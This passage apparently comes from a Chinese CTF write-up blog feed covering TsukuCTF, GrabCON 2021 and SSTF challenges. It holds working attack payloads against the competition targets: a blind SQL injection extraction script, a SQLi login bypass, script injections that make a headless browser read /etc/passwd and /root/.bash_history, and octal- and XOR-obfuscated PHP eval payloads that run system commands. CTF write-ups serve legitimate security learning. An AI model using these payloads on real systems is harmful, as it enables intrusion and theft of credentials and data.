&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;ようこそ&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">page&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">low&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">low&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">end&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select version()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct table_name from information_schema.columnns limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct column_name from information_shcema.columns where table_name=&amp;#39;urtla_secret_tsukushi&amp;#39;limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select secret from urtla_secret_tsukushi_limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是官方wp里的二分法脚本，把简单的事拆成了3个函数，倒是也好，可复用性max&lt;/p>
&lt;p>&lt;code>TsukuCTF{U_Are_Geni0us_T$UKUSH1}&lt;/code>&lt;/p>
&lt;h2 id="webjourney">Web/Journey&lt;/h2>
&lt;p>抓包看，有很多307重定向，还以为是跟之前那个一样要跑一下一千多次的重定向，但是这个重定向是有限度的，最后的位置是/problems/journey/goal，回显405错误&lt;/p>
&lt;p>看wp，学到了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -H &lt;span style="color:#d88200">&amp;#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1&amp;#39;&lt;/span> -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913114745032.png" alt="image-20210913114745032">&lt;/p>
&lt;p>利用的是http请求中的connect方法，相关内容可参见-&amp;gt;&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT">CONNECT(MDN)&lt;/a> | &lt;a href="https://www.jianshu.com/p/54357cdd4736">HTTP之connect method&lt;/a>&lt;/p>
&lt;h2 id="webgyotaku">Web/gyOTAKU&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120544616.png" alt="image-20210913120544616">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120625401.png" alt="image-20210913120625401">&lt;/p>
&lt;p>满足17行要求的话会通过chromium browser来返回一个截图&lt;/p>
&lt;p>我们构造一个如下的html页面&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>返回500错误，再试一下&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/etc/passwd&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>成功返回&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913190757615.png" alt="image-20210913190757615">&lt;/p>
&lt;p>用一下我们的老朋友/root/.bash_history&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/.bash_history&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913191326852.png" alt="image-20210913191326852">&lt;/p>
&lt;p>可以读一下flag了&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/flagc464f9eba1.txt&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>水一篇wp，水水更健康&lt;/p></description></item><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
&lt;blockquote>
&lt;p>Hack admin user!&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>万能密码 &lt;code>username=admin&amp;amp;password=%27%3D%27&lt;/code>&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_pe4sy_SQL_1nj3ct10n}&lt;/code>&lt;/p>
&lt;h2 id="webdoor-lock">Web/Door Lock&lt;/h2>
&lt;blockquote>
&lt;p>The door is open to all! See who is behind the admin door??&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>和上面那个一样的前端页面，但是很显然万能密码失效，随便登入一个号，有水平越权&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904212157898.png" alt="image-20210904212157898">&lt;/p>
&lt;p>用burp跑一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906134840366.png" alt="image-20210906134840366">&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_1D0R_}&lt;/code>&lt;/p>
&lt;h2 id="webnull-food-factory">Web/Null Food Factory&lt;/h2>
&lt;blockquote>
&lt;p>Prove your hacking skill to get admin panel.&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>还是一模一样的前端，目标还是以admin登入&lt;/p>
&lt;p>用到的是Null byte injection，先以&lt;code>admin%00&lt;/code>为用户名注册&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105417519.png" alt="image-20210907105417519">&lt;/p>
&lt;p>然后用Admin的名字登入&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105241455.png" alt="image-20210907105241455">&lt;/p>
&lt;p>&lt;code>GrabCON{Null_byt3s_1s_L0v3}&lt;/code>&lt;/p>
&lt;h2 id="webbasic-calc">Web/Basic Calc&lt;/h2>
&lt;blockquote>
&lt;p>Ever used calc based on php?&lt;/p>
&lt;p>Author: &lt;strong>karma&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[A-Za-z`]+/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$eq&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;BAD.&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Result: &amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; ;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在看到php的题感觉那是相当的亲切了……&lt;/p>
&lt;p>虽然是直接有了eval，但是这个正则过滤的有点狠，字母全被ban掉 就只能用xor或八进制的方式来把字母搞出来&lt;/p>
&lt;p>八进制版本：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\154\163&amp;quot;)
// &amp;quot;system&amp;quot;(&amp;quot;ls&amp;quot;)
&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164&amp;quot;)
// &amp;quot;system(&amp;quot;cat /flagggg.txt&amp;quot;)&amp;quot;
&lt;/code>&lt;/pre>&lt;p>xor&lt;/p>
&lt;pre tabindex="0">&lt;code>Ouput:
(&amp;quot;system&amp;quot;)(&amp;quot;cat /flagggg.txt&amp;quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907111823056.png" alt="image-20210907111823056">&lt;/p>
&lt;p>&lt;code>GrabCON{b4by_php_f0r_y0u}&lt;/code>&lt;/p>
&lt;p>参考： &lt;a href="https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/">https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/&lt;/a> | &lt;a href="https://ctf.0xff.re/2021/uiuctf_2021/phpfuck">https://ctf.0xff.re/2021/uiuctf_2021/phpfuck&lt;/a> | &lt;a href="https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md">https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md&lt;/a> | &lt;a href="https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264">https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264&lt;/a>&lt;/p>
&lt;h2 id="osintprotondate">OSINT/ProtonDate&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the date, when was this email created?&lt;/p>
&lt;p>sc4ry_gh0st@protonmail[dot]com&lt;/p>
&lt;p>GrabCON{dd_mm_yyyy}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>说实话 是纯猜的&lt;/p>
&lt;p>&lt;code>GrabCON{03_09_2021}&lt;/code>&lt;/p>
&lt;p>但是看了wp之后发现这确实有正规的做法，一个开源工具叫&lt;a href="https://github.com/pixelbubble/ProtOSINT">ProtOSINT&lt;/a>，所使用的api如下&lt;/p>
&lt;pre tabindex="0">&lt;code>https://api.protonmail.ch/pks/lookup?op=index&amp;amp;search=sc4ry_gh0st@protonmail.com
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906131321553.png" alt="image-20210906131321553">拿到时间戳1630658267，即Fri 3 September 2021 08:37:47 UTC&lt;/p>
&lt;h2 id="osintvictim-1">OSINT/Victim 1&lt;/h2>
&lt;blockquote>
&lt;p>We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?&lt;/p>
&lt;p>&lt;a href="http://31.207.115.133:8080/cgi-bin/faststream.jpg?stream=half&amp;amp;fps=15&amp;amp;rand=COUNTER">Live Camera&lt;/a>&lt;/p>
&lt;p>GrabCON{zipcode}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>给了一个摄像头的地址，用&lt;a href="https://www.iplocation.net/ip-lookup">IP geolocation lookup&lt;/a>查一下地点&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906210732263.png" alt="image-20210906210732263">&lt;/p>
&lt;p>画面右上有个在动的缆车&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211008725.png" alt="image-20210906211008725">&lt;/p>
&lt;p>zipcode: 39031&lt;/p>
&lt;p>&lt;code>GrabCON{39031}&lt;/code>&lt;/p>
&lt;h2 id="osintwebsite">OSINT/Website&lt;/h2>
&lt;blockquote>
&lt;p>My friend is having a website named, &amp;ldquo;Great Animals Here&amp;rdquo;. He have leaked the flag on his website. Can you find the flag?&lt;/p>
&lt;p>Hint: He used free website builder tool to create his site. greatanimalshere&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;a href="https://greatanimalshere.weebly.com/">https://greatanimalshere.weebly.com/&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101731335.png" alt="image-20210907101731335">&lt;/p>
&lt;h2 id="osintthe-tour1">OSINT/The Tour(1)&lt;/h2>
&lt;blockquote>
&lt;p>w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211622007.png" alt="image-20210906211622007">&lt;/p>
&lt;p>空的，试一下wayback machine&lt;/p>
&lt;pre tabindex="0">&lt;code>https://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/
&lt;/code>&lt;/pre>&lt;p>也是空的，用&lt;a href="https://github.com/sherlock-project/sherlock">sherlock&lt;/a>查一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906214255872.png" alt="image-20210906214255872">&lt;/p>
&lt;p>后面的内容可以&lt;a href="https://kashmir54.github.io/ctfs/GrabCON/#the-tour1">详见wp&lt;/a>了，很少做OSINT，但是感觉好有意思，就是找的好麻烦，脑洞好大，不容易啊&lt;/p>
&lt;h2 id="osintthe-tour2">OSINT/The Tour(2)&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>wp-&amp;gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2&lt;/p>
&lt;h2 id="miscwelcome">Misc/Welcome&lt;/h2>
&lt;blockquote>
&lt;p>GrabCON{welcome_to_grabcon_2021}&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{welcome_to_grabcon_2021}&lt;/code>&lt;/p>
&lt;h2 id="miscdiscord">Misc/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Join our &lt;a href="https://discord.gg/8F9VMVCWb2">discord&lt;/a> server!&lt;/p>
&lt;/blockquote>
&lt;p>憨批机器人，我没搞明白这个是怎么玩的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905092539802.png" alt="image-20210905092539802">&lt;/p>
&lt;p>tmd 试了好久 结果竟然在#role&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906121117043.png" alt="image-20210906121117043">&lt;/p>
&lt;p>&lt;code>GrabCON{s@n1ty_fl4g_1s_here}&lt;/code>&lt;/p>
&lt;p>fxxxk&lt;/p>
&lt;h2 id="miscyoutube">Misc/YouTube&lt;/h2>
&lt;blockquote>
&lt;p>Find us on YouTube.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}&lt;/code>&lt;/p>
&lt;h2 id="miscfind-me">Misc/Find me&lt;/h2>
&lt;blockquote>
&lt;p>Checkout author&amp;rsquo;s social media.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905103746359.png" alt="image-20210905103746359">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101222360.png" alt="image-20210907101222360">&lt;/p>
&lt;p>&lt;code>GrabCON{n0_fl4g_h3r3}&lt;/code>&lt;/p>
&lt;h2 id="cryptowarm-up">Crypto/Warm-up&lt;/h2>
&lt;blockquote>
&lt;p>Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)&amp;amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K
&lt;/code>&lt;/pre>&lt;p>全部是b64加密 很简单了&lt;/p>
&lt;p>&lt;code>GrabCON{dayuum_s0n!}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>好菜好菜，开学了 奥里给&lt;/p></description></item><item><title>SSCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</link><pubDate>Sun, 05 Sep 2021 11:09:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</guid><description>&lt;p>&lt;a href="https://research.samsung.com/sstf">https://research.samsung.com/sstf&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://playground.sstf.site/challenges">https://playground.sstf.site/challenges&lt;/a>&lt;/p>
&lt;h2 id="tutorialpractice-flag-submission">Tutorial/Practice: Flag Submission&lt;/h2>
&lt;p>&lt;code>SCTF{It_15_tim3_t0_hack!!}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-101">Tutorial/BOF 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816204446737.png" alt="image-20210816204446737">&lt;/p>
